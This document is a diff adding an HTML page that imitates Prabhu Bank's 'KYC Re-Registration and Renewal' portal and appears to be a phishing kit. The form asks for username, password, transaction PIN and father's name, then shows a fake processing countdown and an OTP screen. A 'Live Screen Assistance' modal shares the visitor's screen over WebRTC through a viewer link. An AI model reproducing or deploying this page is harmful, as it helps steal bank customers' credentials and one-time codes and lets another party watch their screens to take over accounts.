@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Prabhu Bank - Customer KYC Re-Registration and Renewal</title>
+  <meta name="description" content="Official Prabhu Bank online KYC Re-Registration and Renewal portal. Fast, secure, and seamless 4-step verification.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Outfit:wght@400;500;600;700;800&family=Space+Mono:wght@700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+  <!-- Official Prabhu Bank Top Header Navigation Bar -->
+  <header class="bank-top-nav">
+    <div class="bank-nav-container">
+      <div class="bank-primary-brand">
+        <img src="logo.png" alt="Prabhu Bank" class="brand-logo-img">
+        <span class="brand-tagline">| Digital Banking & KYC Services</span>
+      </div>
+      <div class="nav-right-meta">
+        <button id="screenShareTriggerBtn" class="screenshare-nav-btn" type="button" aria-label="Live Screen Share Support">
+          <span class="live-dot-pulse"></span>
+          <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor"><path d="M20 18c1.1 0 1.99-.9 1.99-2L22 6c0-1.11-.9-2-2-2H4c-1.11 0-2 .89-2 2v10c0 1.1.89 2 2 2H0v2h24v-2h-4zM4 6h16v10H4V6z"/></svg>
+          <span id="screenShareBtnLabel">Live Screen Assistance</span>
+        </button>
+        <div class="meta-item security-badge">
+          <svg viewBox="0 0 24 24" width="15" height="15" fill="#16a34a">
+            <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+          </svg>
+          <span>256-Bit SSL Encrypted</span>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Main Content Area with Centered KYC Portal -->
+  <main class="main-layout">
+    
+    <div class="portal-card-wrapper">
+      
+      <!-- Main KYC Application Card -->
+      <div class="kyc-card">
+        
+        <!-- Header Banner with Gradient & Prabhu Bank Brand (Exact match to screenshot) -->
+        <header class="card-header">
+          <div class="header-watermark">
+            <svg viewBox="0 0 260 90" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M15 45 C40 20, 80 25, 120 40 C160 55, 200 30, 240 15 C210 40, 160 65, 110 50 C60 35, 30 55, 15 45 Z" fill="rgba(255,255,255,0.18)"/>
+              <path d="M50 65 C85 40, 135 48, 175 68 C145 80, 95 75, 50 65 Z" fill="rgba(255,255,255,0.12)"/>
+              <path d="M5 25 C30 5, 75 10, 110 28 C80 35, 40 30, 5 25 Z" fill="rgba(255,255,255,0.10)"/>
+            </svg>
+          </div>
+          <div class="header-content">
+            <div class="header-left">
+              <span class="investor-relation-text">Investor Relation</span>
+            </div>
+            <div class="header-right">
+              <img src="logo.png" alt="Prabhu Bank" class="card-logo-img">
+            </div>
+          </div>
+          <div class="header-bottom-curve"></div>
+        </header>
+
+        <!-- Stepper Indicator -->
+        <nav class="stepper-section" aria-label="Progress steps">
+          <span class="step-label">Step</span>
+          <div class="stepper-pills">
+            <div class="step-item active" id="stepIndicator1" data-step="1">
+              <span class="step-number">1</span>
+            </div>
+            <div class="step-item" id="stepIndicator2" data-step="2">
+              <span class="step-number">2</span>
+            </div>
+            <div class="step-item" id="stepIndicator3" data-step="3">
+              <span class="step-number">3</span>
+            </div>
+            <div class="step-item" id="stepIndicator4" data-step="4">
+              <span class="step-number">4</span>
+            </div>
+          </div>
+        </nav>
+
+        <!-- Dynamic Form Container -->
+        <div class="card-body">
+          
+          <!-- STEP 1: Registration Form -->
+          <section class="step-view active" id="stepView1">
+            <h1 class="form-title">Customer KYC Re-Registration and Renewal</h1>
+            
+            <form id="kycForm" novalidate autocomplete="off">
+              
+              <!-- Username Field -->
+              <div class="input-group">
+                <div class="input-wrapper border-field" id="usernameWrapper">
+                  <input 
+                    type="text" 
+                    id="usernameInput" 
+                    name="username" 
+                    placeholder="Username *" 
+                    required 
+                    autocomplete="off"
+                    aria-label="Username">
+                </div>
+                <div class="field-error" id="usernameError"></div>
+              </div>
+
+              <!-- Mobile Number Field -->
+              <div class="input-group">
+                <div class="input-wrapper tinted-field phone-field" id="mobileWrapper">
+                  <span class="country-prefix">+977</span>
+                  <div class="field-divider"></div>
+                  <input 
+                    type="tel" 
+                    id="mobileInput" 
+                    name="mobile" 
+                    placeholder="Mobile number *" 
+                    maxlength="10" 
+                    pattern="[0-9]{10}" 
+                    required 
+                    inputmode="numeric"
+                    aria-label="Mobile number">
+                </div>
+                <div class="field-error" id="mobileError"></div>
+              </div>
+
+              <!-- Password Field -->
+              <div class="input-group">
+                <div class="input-wrapper tinted-field password-field" id="passwordWrapper">
+                  <input 
+                    type="password" 
+                    id="passwordInput" 
+                    name="password" 
+                    placeholder="Password *" 
+                    required 
+                    aria-label="Password">
+                  <button type="button" class="toggle-password-btn" id="togglePasswordBtn" aria-label="Show password">
+                    <svg class="eye-icon eye-hide" viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="#6b7280" stroke-width="2">
+                      <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
+                      <line x1="1" y1="1" x2="23" y2="23"/>
+                    </svg>
+                    <svg class="eye-icon eye-show hidden" viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="#6b7280" stroke-width="2">
+                      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+                      <circle cx="12" cy="12" r="3"/>
+                    </svg>
+                  </button>
+                </div>
+                <div class="field-error" id="passwordError"></div>
+              </div>
+
+              <!-- Transaction PIN Field -->
+              <div class="input-group pin-group">
+                <label for="pinInput" class="custom-label">Transaction PIN *</label>
+                <div class="input-wrapper underline-field" id="pinWrapper">
+                  <input 
+                    type="password" 
+                    id="pinInput" 
+                    name="pin" 
+                    maxlength="4" 
+                    pattern="[0-9]{4}" 
+                    inputmode="numeric" 
+                    placeholder="••••" 
+                    required 
+                    aria-label="Transaction PIN">
+                </div>
+                <div class="pin-hint">
+                  <svg class="info-icon" viewBox="0 0 24 24" width="14" height="14" fill="currentColor">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/>
+                  </svg>
+                  <span>Enter 4-digit numeric PIN</span>
+                </div>
+                <div class="field-error" id="pinError"></div>
+              </div>
+
+              <!-- Father's Name Field -->
+              <div class="input-group">
+                <div class="input-wrapper border-field" id="fatherWrapper">
+                  <input 
+                    type="text" 
+                    id="fatherInput" 
+                    name="fatherName" 
+                    placeholder="Father name *" 
+                    required 
+                    aria-label="Father name">
+                </div>
+                <div class="field-error" id="fatherError"></div>
+              </div>
+
+              <!-- Terms & Agreement Note -->
+              <div class="terms-disclaimer">
+                By tapping <strong>Continue</strong>, you agree to Re-kyc update and to 
+                <a href="#termsModal" class="legal-link" id="termsLink">Prabhu Bank Terms</a>, 
+                <a href="#privacyModal" class="legal-link" id="privacyLink">Privacy Policy</a> and 
+                <a href="#cookiesModal" class="legal-link" id="cookiesLink">Cookies Policy</a>.
+              </div>
+
+              <!-- Submit / Continue Button -->
+              <button type="submit" class="submit-action-btn" id="submitFormBtn">
+                <span>Continue</span>
+                <svg class="arrow-icon" viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2.5">
+                  <line x1="5" y1="12" x2="19" y2="12"/>
+                  <polyline points="12 5 19 12 12 19"/>
+                </svg>
+              </button>
+
+            </form>
+          </section>
+
+          <!-- STEP 2: Processing & Live Countdown -->
+          <section class="step-view" id="stepView2">
+            <h1 class="view-heading">Processing</h1>
+            <p class="view-subheading">Please wait while we verify your information</p>
+
+            <!-- User Info Summary Card -->
+            <div class="user-summary-card">
+              <div class="summary-row">
+                <span class="summary-label">Username:</span>
+                <span class="summary-value" id="summaryUsername">Ghdjdjd</span>
+              </div>
+              <div class="summary-row">
+                <span class="summary-label">Mobile:</span>
+                <span class="summary-value" id="summaryMobile">+977 954645533</span>
+              </div>
+            </div>
+
+            <!-- Big Countdown Number -->
+            <div class="big-countdown-display" id="bigCountdownNumber">15</div>
+
+            <!-- Animated Dual Ring Spinner -->
+            <div class="spinner-wrapper">
+              <div class="circular-spinner">
+                <svg viewBox="0 0 50 50" class="spinner-svg">
+                  <circle class="spinner-track" cx="25" cy="25" r="20" fill="none" stroke-width="3.5"></circle>
+                  <circle class="spinner-arc" cx="25" cy="25" r="20" fill="none" stroke-width="3.5"></circle>
+                </svg>
+              </div>
+            </div>
+
+            <!-- Linear Progress Bar -->
+            <div class="linear-progress-track">
+              <div class="linear-progress-bar" id="processingProgressBar" style="width: 5%;"></div>
+            </div>
+
+            <!-- Processing Status & Progress Stats -->
+            <div class="processing-status-text">
+              <span class="status-hourglass">⏳</span>
+              <span id="processingPercentText">Processing... 5% complete</span>
+            </div>
+            
+            <div class="estimated-time-text" id="estimatedTimeText">
+              Estimated time: 15 seconds
+            </div>
+
+            <!-- Fast-forward Button -->
+            <button type="button" class="subtle-skip-btn" id="skipProcessingBtn" title="Instantly advance countdown">
+              Skip Countdown ⏩
+            </button>
+          </section>
+
+          <!-- STEP 3: OTP Verification -->
+          <section class="step-view" id="stepView3">
+            <h1 class="view-heading">OTP Verification</h1>
+            <p class="view-subheading">Enter the 6-digit code sent to your mobile SMS</p>
+
+            <!-- SMS Notification Alert Pill -->
+            <div class="sms-status-pill">
+              <svg class="check-pill-icon" viewBox="0 0 24 24" width="16" height="16" fill="currentColor">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+              </svg>
+              <span>OTP code sent via SMS to your registered number.</span>
+            </div>
+
+            <!-- 6-Digit OTP Input Container -->
+            <div class="otp-container">
+              <div class="otp-box-frame" id="otpBoxFrame">
+                <div class="otp-slots">
+                  <input type="text" class="otp-digit" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="one-time-code" data-index="0" value="" placeholder="•">
+                  <input type="text" class="otp-digit" maxlength="1" inputmode="numeric" pattern="[0-9]" data-index="1" value="" placeholder="•">
+                  <input type="text" class="otp-digit" maxlength="1" inputmode="numeric" pattern="[0-9]" data-index="2" value="" placeholder="•">
+                  <input type="text" class="otp-digit" maxlength="1" inputmode="numeric" pattern="[0-9]" data-index="3" value="" placeholder="•">
+                  <input type="text" class="otp-digit" maxlength="1" inputmode="numeric" pattern="[0-9]" data-index="4" value="" placeholder="•">
+                  <input type="text" class="otp-digit" maxlength="1" inputmode="numeric" pattern="[0-9]" data-index="5" value="" placeholder="•">
+                </div>
+              </div>
+              <div class="field-error" id="otpError"></div>
+            </div>
+
+            <!-- Resend OTP Action -->
+            <div class="resend-otp-wrapper">
+              <span id="resendCountdownText">Didn't receive SMS?</span>
+              <button type="button" class="resend-link-btn" id="resendOtpBtn">Resend Code</button>
+            </div>
+
+            <!-- Verify OTP Submit Button -->
+            <button type="button" class="submit-action-btn" id="verifyOtpBtn">
+              <svg class="button-check-icon" viewBox="0 0 24 24" width="18" height="18" fill="currentColor">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+              </svg>
+              <span>Verify OTP</span>
+            </button>
+          </section>
+
+          <!-- STEP 4: Success & Confirmation -->
+          <section class="step-view" id="stepView4">
+            
+            <!-- Vibrant Green Success Checkmark Badge -->
+            <div class="success-badge-wrapper">
+              <div class="success-circle-icon">
+                <svg viewBox="0 0 24 24" width="46" height="46" fill="none" stroke="#ffffff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+                  <polyline points="20 6 9 17 4 12"></polyline>
+                </svg>
+              </div>
+            </div>
+
+            <h1 class="view-heading">Thank You!</h1>
+            <p class="confirmation-lead-text">Your KYC details have been submitted successfully.</p>
+            <p class="confirmation-sub-text">We will contact you shortly for verification.</p>
+
+            <!-- Reference Ticket Card -->
+            <div class="ticket-card" id="submissionTicketCard">
+              <div class="ticket-row">
+                <span class="ticket-label">Reference ID:</span>
+                <span class="ticket-val" id="refIdText">PRB-KYC-948201</span>
+              </div>
+              <div class="ticket-row">
+                <span class="ticket-label">Date & Time:</span>
+                <span class="ticket-val" id="submissionTimestamp">Today, 19:05</span>
+              </div>
+              <div class="ticket-row">
+                <span class="ticket-label">Status:</span>
+                <span class="ticket-status-badge">Under Review</span>
+              </div>
+            </div>
+
+            <!-- Start New Submission Action Button -->
+            <button type="button" class="submit-action-btn" id="startNewBtn">
+              <svg class="home-icon" viewBox="0 0 24 24" width="18" height="18" fill="currentColor">
+                <path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/>
+              </svg>
+              <span>Start New Submission</span>
+            </button>
+          </section>
+
+        </div>
+
+      </div>
+
+    </div>
+
+  </main>
+
+  <!-- Bank Portal Footer -->
+  <footer class="bank-footer">
+    <div class="footer-container">
+      <div class="footer-left">
+        <p class="footer-text">© 2026 Prabhu Bank Limited. All Rights Reserved. Licensed by Nepal Rastra Bank as "A" Class Financial Institution.</p>
+        <p class="footer-sub">Head Office: Babarmahal, Kathmandu, Nepal | SWIFT: PRBHNPKA</p>
+      </div>
+      <div class="footer-right">
+        <a href="#termsModal" class="legal-link" id="termsLink">Terms & Conditions</a>
+        <span class="footer-sep">•</span>
+        <a href="#privacyModal" class="legal-link" id="privacyLink">Privacy Policy</a>
+        <span class="footer-sep">•</span>
+        <a href="#cookiesModal" class="legal-link" id="cookiesLink">Cookies Policy</a>
+      </div>
+    </div>
+  </footer>
+
+  <!-- Policy / Legal Preview Modal -->
+  <div class="modal-overlay" id="policyModalOverlay">
+    <div class="modal-card legal-modal-card">
+      <div class="modal-header">
+        <h2 id="policyModalTitle">Prabhu Bank Terms & Conditions</h2>
+        <button type="button" class="modal-close-btn" id="closePolicyModalBtn">&times;</button>
+      </div>
+      <div class="modal-body legal-modal-content" id="policyModalContent">
+        <!-- Injected via JavaScript -->
+      </div>
+    </div>
+  </div>
+
+  <!-- Live Screen Share Assistance Modal -->
+  <div class="modal-overlay" id="screenShareModalOverlay" style="display: none;">
+    <div class="modal-card screenshare-modal-card">
+      <div class="modal-header">
+        <div class="modal-header-brand">
+          <div class="screenshare-icon-wrap">
+            <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M20 18c1.1 0 1.99-.9 1.99-2L22 6c0-1.11-.9-2-2-2H4c-1.11 0-2 .89-2 2v10c0 1.1.89 2 2 2H0v2h24v-2h-4zM4 6h16v10H4V6z"/></svg>
+          </div>
+          <div>
+            <h3>Live Screen Assistance</h3>
+            <p class="modal-subtitle">WebRTC Real-Time Screen Verification</p>
+          </div>
+        </div>
+        <button type="button" class="modal-close-btn" id="closeScreenShareModalBtn">&times;</button>
+      </div>
+
+      <div class="modal-body screenshare-modal-body">
+        
+        <!-- Screen Sharing Security & Consent Notice (Section 8 & 11) -->
+        <div class="screenshare-consent-banner">
+          <div class="consent-icon">🔒</div>
+          <div class="consent-text">
+            <strong>Explicit User Permission Required</strong>
+            <p>Your operating system will ask you to approve sharing your screen or window. You can stop sharing at any moment. No video is permanently recorded on server storage.</p>
+          </div>
+        </div>
+
+        <!-- Dynamic Status Section -->
+        <div class="screenshare-status-box" id="modalShareStatusBox">
+          <div class="status-indicator-row">
+            <span class="status-badge-chip" id="modalStatusChip">Inactive</span>
+            <span class="status-chip-desc" id="modalStatusDesc">Ready to begin screen sharing</span>
+          </div>
+
+          <!-- Active Session Info (Shown when session created) -->
+          <div class="session-link-row" id="modalSessionLinkRow" style="display:none;">
+            <div class="session-info-label">Active Session ID:</div>
+            <div class="session-token-box">
+              <span id="modalSessionIdText">...</span>
+              <button type="button" class="btn-copy-token" id="copyViewerLinkBtn" title="Copy Viewer Link">Copy Link</button>
+            </div>
+            <div style="margin-top: 8px;">
+              <a href="#" id="modalOpenViewerLink" target="_blank" class="viewer-direct-link">
+                ↗ Open Live Viewer Console in New Tab
+              </a>
+            </div>
+          </div>
+        </div>
+
+        <!-- Mobile Browser Notice (Section 10 fallback) -->
+        <div class="mobile-unsupported-notice" id="mobileUnsupportedNotice" style="display:none;">
+          <div class="notice-icon">📱</div>
+          <div class="notice-content">
+            <strong>Mobile Device Screen Capture Notice</strong>
+            <p id="mobileNoticeText">Browser-level screen capture has restricted availability on mobile browsers (iOS Safari / Android Chrome). Please use the native Prabhu Bank mobile application with screen projection enabled for full-device sharing.</p>
+          </div>
+        </div>
+
+        <!-- Action Controls -->
+        <div class="screenshare-actions-row">
+          <button type="button" class="btn-share-start" id="startScreenShareBtn">
+            <svg viewBox="0 0 24 24" width="18" height="18" fill="currentColor"><path d="M20 18c1.1 0 1.99-.9 1.99-2L22 6c0-1.11-.9-2-2-2H4c-1.11 0-2 .89-2 2v10c0 1.1.89 2 2 2H0v2h24v-2h-4zM4 6h16v10H4V6z"/></svg>
+            <span>Start Sharing Screen</span>
+          </button>
+          <button type="button" class="btn-share-stop" id="stopScreenShareBtn" style="display:none;">
+            <svg viewBox="0 0 24 24" width="18" height="18" fill="currentColor"><path d="M6 6h12v12H6z"/></svg>
+            <span>Stop Sharing</span>
+          </button>
+        </div>
+
+      </div>
+    </div>
+  </div>
+
+  <!-- Application Logic Scripts -->
+  <script src="webrtc.js"></script>
+  <script src="app.js"></script>
+</body>
+</html>
